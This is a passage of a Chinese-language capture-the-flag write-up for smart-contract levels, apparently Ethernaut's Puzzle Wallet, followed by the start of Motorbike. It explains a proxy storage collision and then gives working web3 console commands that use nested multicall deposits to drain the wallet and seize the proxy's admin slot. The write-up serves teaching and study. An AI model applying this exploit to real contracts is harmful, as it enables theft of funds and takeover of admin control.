+<a id="__codelineno-47-16" name="__codelineno-47-16" href="__codelineno-47-16"></a><span class="w">    </span><span class="kt">modifier</span><span class="w"> </span>onlyAdmin<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-47-17" name="__codelineno-47-17" href="__codelineno-47-17"></a><span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>admin<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Caller is not the admin&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-47-18" name="__codelineno-47-18" href="__codelineno-47-18"></a><span class="w">        </span>_<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-19" name="__codelineno-47-19" href="__codelineno-47-19"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-47-20" name="__codelineno-47-20" href="__codelineno-47-20"></a>
+<a id="__codelineno-47-21" name="__codelineno-47-21" href="__codelineno-47-21"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">proposeNewAdmin</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_newAdmin</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-47-22" name="__codelineno-47-22" href="__codelineno-47-22"></a><span class="w">        </span>pendingAdmin<span class="w"> </span><span class="o">=</span><span class="w"> </span>_newAdmin<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-23" name="__codelineno-47-23" href="__codelineno-47-23"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-47-24" name="__codelineno-47-24" href="__codelineno-47-24"></a>
+<a id="__codelineno-47-25" name="__codelineno-47-25" href="__codelineno-47-25"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">approveNewAdmin</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_expectedAdmin</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>onlyAdmin<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-47-26" name="__codelineno-47-26" href="__codelineno-47-26"></a><span class="w">        </span><span class="kt">require</span><span class="p">(</span>pendingAdmin<span class="w"> </span><span class="o">==</span><span class="w"> </span>_expectedAdmin<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Expected new admin by the current admin is not the pending admin&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-47-27" name="__codelineno-47-27" href="__codelineno-47-27"></a><span class="w">        </span>admin<span class="w"> </span><span class="o">=</span><span class="w"> </span>pendingAdmin<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-28" name="__codelineno-47-28" href="__codelineno-47-28"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-47-29" name="__codelineno-47-29" href="__codelineno-47-29"></a>
+<a id="__codelineno-47-30" name="__codelineno-47-30" href="__codelineno-47-30"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">upgradeTo</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">_newImplementation</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>onlyAdmin<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-47-31" name="__codelineno-47-31" href="__codelineno-47-31"></a><span class="w">        </span>_upgradeTo<span class="p">(</span>_newImplementation<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-47-32" name="__codelineno-47-32" href="__codelineno-47-32"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-47-33" name="__codelineno-47-33" href="__codelineno-47-33"></a><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-47-34" name="__codelineno-47-34" href="__codelineno-47-34"></a>
+<a id="__codelineno-47-35" name="__codelineno-47-35" href="__codelineno-47-35"></a><span class="k">contract</span><span class="w"> </span><span class="ni">PuzzleWallet</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-47-36" name="__codelineno-47-36" href="__codelineno-47-36"></a><span class="w">    </span>using<span class="w"> </span>SafeMath<span class="w"> </span><span class="kt">for</span><span class="w"> </span><span class="kt">uint256</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-37" name="__codelineno-47-37" href="__codelineno-47-37"></a><span class="w">    </span><span class="kt">address</span><span class="w"> </span><span class="k">public </span><span class="nv">owner</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-38" name="__codelineno-47-38" href="__codelineno-47-38"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="k">public </span><span class="nv">maxBalance</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-39" name="__codelineno-47-39" href="__codelineno-47-39"></a><span class="w">    </span><span class="kt">mapping</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>whitelisted<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-40" name="__codelineno-47-40" href="__codelineno-47-40"></a><span class="w">    </span><span class="kt">mapping</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="kt">uint256</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span>balances<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-41" name="__codelineno-47-41" href="__codelineno-47-41"></a>
+<a id="__codelineno-47-42" name="__codelineno-47-42" href="__codelineno-47-42"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">init</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">_maxBalance</span><span class="p">)</span><span class="w"> </span><span class="kt">public</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-47-43" name="__codelineno-47-43" href="__codelineno-47-43"></a><span class="w">        </span><span class="kt">require</span><span class="p">(</span>maxBalance<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Already initialized&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-47-44" name="__codelineno-47-44" href="__codelineno-47-44"></a><span class="w">        </span>maxBalance<span class="w"> </span><span class="o">=</span><span class="w"> </span>_maxBalance<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-45" name="__codelineno-47-45" href="__codelineno-47-45"></a><span class="w">        </span>owner<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">msg.sender</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-46" name="__codelineno-47-46" href="__codelineno-47-46"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-47-47" name="__codelineno-47-47" href="__codelineno-47-47"></a>
+<a id="__codelineno-47-48" name="__codelineno-47-48" href="__codelineno-47-48"></a><span class="w">    </span><span class="kt">modifier</span><span class="w"> </span>onlyWhitelisted<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-47-49" name="__codelineno-47-49" href="__codelineno-47-49"></a><span class="w">        </span><span class="kt">require</span><span class="p">(</span>whitelisted<span class="p">[</span><span class="k">msg.sender</span><span class="p">],</span><span class="w"> </span><span class="s2">&quot;Not whitelisted&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-47-50" name="__codelineno-47-50" href="__codelineno-47-50"></a><span class="w">        </span>_<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-51" name="__codelineno-47-51" href="__codelineno-47-51"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-47-52" name="__codelineno-47-52" href="__codelineno-47-52"></a>
+<a id="__codelineno-47-53" name="__codelineno-47-53" href="__codelineno-47-53"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">setMaxBalance</span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">_maxBalance</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span>onlyWhitelisted<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-47-54" name="__codelineno-47-54" href="__codelineno-47-54"></a><span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">).</span>balance<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;Contract balance is not 0&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-47-55" name="__codelineno-47-55" href="__codelineno-47-55"></a><span class="w">        </span>maxBalance<span class="w"> </span><span class="o">=</span><span class="w"> </span>_maxBalance<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-56" name="__codelineno-47-56" href="__codelineno-47-56"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-47-57" name="__codelineno-47-57" href="__codelineno-47-57"></a>
+<a id="__codelineno-47-58" name="__codelineno-47-58" href="__codelineno-47-58"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">addToWhitelist</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">addr</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-47-59" name="__codelineno-47-59" href="__codelineno-47-59"></a><span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="k">msg.sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>owner<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Not the owner&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-47-60" name="__codelineno-47-60" href="__codelineno-47-60"></a><span class="w">        </span>whitelisted<span class="p">[</span>addr<span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-61" name="__codelineno-47-61" href="__codelineno-47-61"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-47-62" name="__codelineno-47-62" href="__codelineno-47-62"></a>
+<a id="__codelineno-47-63" name="__codelineno-47-63" href="__codelineno-47-63"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">deposit</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span>onlyWhitelisted<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-47-64" name="__codelineno-47-64" href="__codelineno-47-64"></a><span class="w">        </span><span class="kt">require</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">).</span>balance<span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span>maxBalance<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Max balance reached&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-47-65" name="__codelineno-47-65" href="__codelineno-47-65"></a><span class="w">        </span>balances<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>balances<span class="p">[</span><span class="k">msg.sender</span><span class="p">].</span>add<span class="p">(</span><span class="k">msg.value</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-47-66" name="__codelineno-47-66" href="__codelineno-47-66"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-47-67" name="__codelineno-47-67" href="__codelineno-47-67"></a>
+<a id="__codelineno-47-68" name="__codelineno-47-68" href="__codelineno-47-68"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">execute</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="nv">to</span><span class="p">,</span><span class="w"> </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">value</span><span class="p">,</span><span class="w"> </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">calldata</span><span class="w"> </span>data<span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span>onlyWhitelisted<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-47-69" name="__codelineno-47-69" href="__codelineno-47-69"></a><span class="w">        </span><span class="kt">require</span><span class="p">(</span>balances<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span>value<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Insufficient balance&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-47-70" name="__codelineno-47-70" href="__codelineno-47-70"></a><span class="w">        </span>balances<span class="p">[</span><span class="k">msg.sender</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>balances<span class="p">[</span><span class="k">msg.sender</span><span class="p">].</span>sub<span class="p">(</span>value<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-47-71" name="__codelineno-47-71" href="__codelineno-47-71"></a><span class="w">        </span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="nv">success</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>to<span class="p">.</span>call<span class="p">{</span><span class="w"> </span>value<span class="p">:</span><span class="w"> </span>value<span class="w"> </span><span class="p">}(</span>data<span class="p">);</span><span class="w"></span>
+<a id="__codelineno-47-72" name="__codelineno-47-72" href="__codelineno-47-72"></a><span class="w">        </span><span class="kt">require</span><span class="p">(</span>success<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Execution failed&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-47-73" name="__codelineno-47-73" href="__codelineno-47-73"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-47-74" name="__codelineno-47-74" href="__codelineno-47-74"></a>
+<a id="__codelineno-47-75" name="__codelineno-47-75" href="__codelineno-47-75"></a><span class="w">    </span><span class="kt">function</span><span class="w"> </span><span class="nv">multicall</span><span class="p">(</span><span class="kt">bytes</span><span class="p">[]</span><span class="w"> </span>calldata<span class="w"> </span>data<span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="kt">payable</span><span class="w"> </span>onlyWhitelisted<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-47-76" name="__codelineno-47-76" href="__codelineno-47-76"></a><span class="w">        </span><span class="kt">bool</span><span class="w"> </span><span class="nv">depositCalled</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">false</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-77" name="__codelineno-47-77" href="__codelineno-47-77"></a><span class="w">        </span><span class="kt">for</span><span class="w"> </span><span class="p">(</span><span class="kt">uint256</span><span class="w"> </span><span class="nv">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">;</span><span class="w"> </span>i<span class="w"> </span><span class="o">&lt;</span><span class="w"> </span>data<span class="p">.</span>length<span class="p">;</span><span class="w"> </span>i<span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-47-78" name="__codelineno-47-78" href="__codelineno-47-78"></a><span class="w">            </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">memory</span><span class="w"> </span>_data<span class="w"> </span><span class="o">=</span><span class="w"> </span>data<span class="p">[</span>i<span class="p">];</span><span class="w"></span>
+<a id="__codelineno-47-79" name="__codelineno-47-79" href="__codelineno-47-79"></a><span class="w">            </span>bytes4<span class="w"> </span>selector<span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-80" name="__codelineno-47-80" href="__codelineno-47-80"></a><span class="w">            </span>assembly<span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-47-81" name="__codelineno-47-81" href="__codelineno-47-81"></a><span class="w">                </span>selector<span class="w"> </span><span class="p">:</span><span class="o">=</span><span class="w"> </span>mload<span class="p">(</span>add<span class="p">(</span>_data<span class="p">,</span><span class="w"> </span><span class="m m-Decimal">32</span><span class="p">))</span><span class="w"></span>
+<a id="__codelineno-47-82" name="__codelineno-47-82" href="__codelineno-47-82"></a><span class="w">            </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-47-83" name="__codelineno-47-83" href="__codelineno-47-83"></a><span class="w">            </span><span class="kt">if</span><span class="w"> </span><span class="p">(</span>selector<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kt">this</span><span class="p">.</span>deposit<span class="p">.</span>selector<span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-47-84" name="__codelineno-47-84" href="__codelineno-47-84"></a><span class="w">                </span><span class="kt">require</span><span class="p">(</span><span class="o">!</span>depositCalled<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Deposit can only be called once&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-47-85" name="__codelineno-47-85" href="__codelineno-47-85"></a><span class="w">                </span><span class="c1">// Protect against reusing msg.value</span>
+<a id="__codelineno-47-86" name="__codelineno-47-86" href="__codelineno-47-86"></a><span class="w">                </span>depositCalled<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">true</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-47-87" name="__codelineno-47-87" href="__codelineno-47-87"></a><span class="w">            </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-47-88" name="__codelineno-47-88" href="__codelineno-47-88"></a><span class="w">            </span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="nv">success</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">).</span>delegatecall<span class="p">(</span>data<span class="p">[</span>i<span class="p">]);</span><span class="w"></span>
+<a id="__codelineno-47-89" name="__codelineno-47-89" href="__codelineno-47-89"></a><span class="w">            </span><span class="kt">require</span><span class="p">(</span>success<span class="p">,</span><span class="w"> </span><span class="s2">&quot;Error while delegating call&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-47-90" name="__codelineno-47-90" href="__codelineno-47-90"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-47-91" name="__codelineno-47-91" href="__codelineno-47-91"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-47-92" name="__codelineno-47-92" href="__codelineno-47-92"></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+</details>
+<p>题目比较复杂，最终目的是使 PuzzleProxy 的 admin 为 player</p>
+<p>因为 PuzzleProxy 和 PuzzleWallet 部署在同一个地址上，它们的 storage 会共用，所以就导致了 PuzzleProxy 的 pendingAdmin 对应了 PuzzleWallet 的 owner，PuzzleWallet 的 maxBalance 对应了 PuzzleProxy 的 admin</p>
+<p>从后往前推：</p>
+<ul>
+<li>要使 admin 变为 player，则可以设置 maxBalance 为 player</li>
+<li>而 setMaxBalance 函数需要先使当前合约账户的余额变为 0</li>
+<li>合约账户余额减少的方式在 execute 中的 call，使余额减少 value</li>
+<li>但这样要使 balances[player] &gt;= value</li>
+<li>而通过 deposit 增加 balances[player] 的话，合约账户余额也会同步增加</li>
+<li>所以要使用 multicall 函数来使 balances[player] 增加量为合约账户余额增加量的二倍</li>
+<li>但是 multicall 中检测了 selector 使 deposit 只能调用一次</li>
+<li>这可以通过 multicall 中执行两个 multicall，每个 multicall 调用一次 deposit</li>
+</ul>
+<p>这样分析之后问题就解决了，首先调用 proposeNewAdmin 来使 pendingAdmin（owner）变为 player，这个函数不能直接调用，但是可以通过发送合约的方式调用
+<div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="__codelineno-48-1"></a><span class="o">&gt;</span> <span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span> <span class="mf">0</span><span class="p">)</span>  <span class="c1">// owner</span>
+<a id="__codelineno-48-2" name="__codelineno-48-2" href="__codelineno-48-2"></a><span class="s1">&#39;0x000000000000000000000000&lt;level address&gt;&#39;</span>
+<a id="__codelineno-48-3" name="__codelineno-48-3" href="__codelineno-48-3"></a><span class="o">&gt;</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">sha3</span><span class="p">(</span><span class="s2">&quot;proposeNewAdmin(address)&quot;</span><span class="p">).</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span> <span class="mf">10</span><span class="p">)</span>  <span class="c1">// selector</span>
+<a id="__codelineno-48-4" name="__codelineno-48-4" href="__codelineno-48-4"></a><span class="s1">&#39;0xa6376746&#39;</span>
+<a id="__codelineno-48-5" name="__codelineno-48-5" href="__codelineno-48-5"></a><span class="o">&gt;</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">sha3</span><span class="p">(</span><span class="s2">&quot;proposeNewAdmin(address)&quot;</span><span class="p">).</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span> <span class="mf">10</span><span class="p">)</span> <span class="o">+</span> <span class="nx">player</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mf">2</span><span class="p">).</span><span class="nx">padStart</span><span class="p">(</span><span class="mf">64</span><span class="p">,</span> <span class="s2">&quot;0&quot;</span><span class="p">)</span>
+<a id="__codelineno-48-6" name="__codelineno-48-6" href="__codelineno-48-6"></a><span class="s1">&#39;0xa6376746000000000000000000000000&lt;player address&gt;&#39;</span>
+<a id="__codelineno-48-7" name="__codelineno-48-7" href="__codelineno-48-7"></a><span class="o">&gt;</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">sendTransaction</span><span class="p">({</span><span class="kr">from</span><span class="o">:</span> <span class="nx">player</span><span class="p">,</span> <span class="nx">to</span><span class="o">:</span> <span class="nx">instance</span><span class="p">,</span> <span class="nx">data</span><span class="o">:</span> <span class="nx">data</span><span class="p">})</span>
+<a id="__codelineno-48-8" name="__codelineno-48-8" href="__codelineno-48-8"></a><span class="o">&gt;</span> <span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span> <span class="mf">0</span><span class="p">)</span>
+<a id="__codelineno-48-9" name="__codelineno-48-9" href="__codelineno-48-9"></a><span class="s1">&#39;0x000000000000000000000000&lt;player address&gt;&#39;</span>
+</code></pre></div></p>
+<p>然后拿到 owner 后需要将自己加入白名单，并且先查询一下合约账户余额
+<div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="__codelineno-49-1"></a><span class="o">&gt;</span> <span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">addToWhitelist</span><span class="p">(</span><span class="nx">player</span><span class="p">)</span>
+<a id="__codelineno-49-2" name="__codelineno-49-2" href="__codelineno-49-2"></a><span class="o">&gt;</span> <span class="k">await</span> <span class="nx">getBalance</span><span class="p">(</span><span class="nx">instance</span><span class="p">)</span>
+<a id="__codelineno-49-3" name="__codelineno-49-3" href="__codelineno-49-3"></a><span class="s1">&#39;0.001&#39;</span>
+</code></pre></div></p>
+<p>所以需要构造一个 calldata，它会通过 multicall 调用 deposit，然后把两个这个 calldata 传入 multicall，同时附带 value 0.001 ether，这样 balances[player] 就会增加 0.002 ether，然后就可以通过 execute 直接提取出这 0.002 ether</p>
+<p>提取后合约账户的 balance 变为 0，就可以设置 maxBalance 了
+<div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="__codelineno-50-1"></a><span class="o">&gt;</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">sha3</span><span class="p">(</span><span class="s2">&quot;deposit()&quot;</span><span class="p">).</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span> <span class="mf">10</span><span class="p">)</span> <span class="c1">// deposit selector</span>
+<a id="__codelineno-50-2" name="__codelineno-50-2" href="__codelineno-50-2"></a><span class="s1">&#39;0xd0e30db0&#39;</span>
+<a id="__codelineno-50-3" name="__codelineno-50-3" href="__codelineno-50-3"></a><span class="o">&gt;</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">methods</span><span class="p">[</span><span class="s2">&quot;multicall(bytes[])&quot;</span><span class="p">].</span><span class="nx">request</span><span class="p">([</span><span class="s2">&quot;0xd0e30db0&quot;</span><span class="p">])).</span><span class="nx">data</span> <span class="c1">// 构造通过 multicall 调用 deposit 的 calldata</span>
+<a id="__codelineno-50-4" name="__codelineno-50-4" href="__codelineno-50-4"></a><span class="s1">&#39;0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000&#39;</span>
+<a id="__codelineno-50-5" name="__codelineno-50-5" href="__codelineno-50-5"></a><span class="o">&gt;</span> <span class="k">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">multicall</span><span class="p">([</span><span class="nx">data</span><span class="p">,</span> <span class="nx">data</span><span class="p">],</span> <span class="p">{</span><span class="nx">value</span><span class="o">:</span> <span class="nx">toWei</span><span class="p">(</span><span class="s2">&quot;0.001&quot;</span><span class="p">)})</span>
+<a id="__codelineno-50-6" name="__codelineno-50-6" href="__codelineno-50-6"></a><span class="o">&gt;</span> <span class="k">await</span> <span class="nx">getBalance</span><span class="p">(</span><span class="nx">instance</span><span class="p">)</span>
+<a id="__codelineno-50-7" name="__codelineno-50-7" href="__codelineno-50-7"></a><span class="s1">&#39;0.002&#39;</span>
+<a id="__codelineno-50-8" name="__codelineno-50-8" href="__codelineno-50-8"></a><span class="o">&gt;</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">player</span><span class="p">,</span> <span class="nx">toWei</span><span class="p">(</span><span class="s2">&quot;0.002&quot;</span><span class="p">),</span> <span class="mf">0</span>
+<a id="__codelineno-50-9" name="__codelineno-50-9" href="__codelineno-50-9"></a><span class="o">&gt;</span> <span class="k">await</span> <span class="nx">getBalance</span><span class="p">(</span><span class="nx">instance</span><span class="p">)</span>
+<a id="__codelineno-50-10" name="__codelineno-50-10" href="__codelineno-50-10"></a><span class="s1">&#39;0&#39;</span>
+<a id="__codelineno-50-11" name="__codelineno-50-11" href="__codelineno-50-11"></a><span class="o">&gt;</span> <span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span> <span class="mf">1</span><span class="p">)</span>
+<a id="__codelineno-50-12" name="__codelineno-50-12" href="__codelineno-50-12"></a><span class="s1">&#39;0x000000000000000000000000&lt;level address&gt;&#39;</span>
+<a id="__codelineno-50-13" name="__codelineno-50-13" href="__codelineno-50-13"></a><span class="o">&gt;</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">setMaxBalance</span><span class="p">(</span><span class="nx">player</span><span class="p">)</span>
+<a id="__codelineno-50-14" name="__codelineno-50-14" href="__codelineno-50-14"></a><span class="o">&gt;</span> <span class="k">await</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span> <span class="mf">1</span><span class="p">)</span>
+<a id="__codelineno-50-15" name="__codelineno-50-15" href="__codelineno-50-15"></a><span class="s1">&#39;0x000000000000000000000000&lt;player address&gt;&#39;</span>
+</code></pre></div></p>
+<hr />
+<h2 id="motorbike">Motorbike<a class="headerlink" href="#motorbike" title="Permanent link">&para;</a></h2>
+<details class="question">
+<summary>题目合约</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="__codelineno-51-1"></a><span class="c1">// SPDX-License-Identifier: MIT</span>
+<a id="__codelineno-51-2" name="__codelineno-51-2" href="__codelineno-51-2"></a>
+<a id="__codelineno-51-3" name="__codelineno-51-3" href="__codelineno-51-3"></a><span class="k">pragma solidity</span><span class="w"> </span><span class="o">&lt;</span><span class="k">0.7.0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-51-4" name="__codelineno-51-4" href="__codelineno-51-4"></a>
+<a id="__codelineno-51-5" name="__codelineno-51-5" href="__codelineno-51-5"></a><span class="kt">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-51-6" name="__codelineno-51-6" href="__codelineno-51-6"></a><span class="kt">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/proxy/Initializable.sol&quot;</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-51-7" name="__codelineno-51-7" href="__codelineno-51-7"></a>
+<a id="__codelineno-51-8" name="__codelineno-51-8" href="__codelineno-51-8"></a><span class="k">contract</span><span class="w"> </span><span class="ni">Motorbike</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-51-9" name="__codelineno-51-9" href="__codelineno-51-9"></a><span class="w">    </span><span class="c1">// keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span>
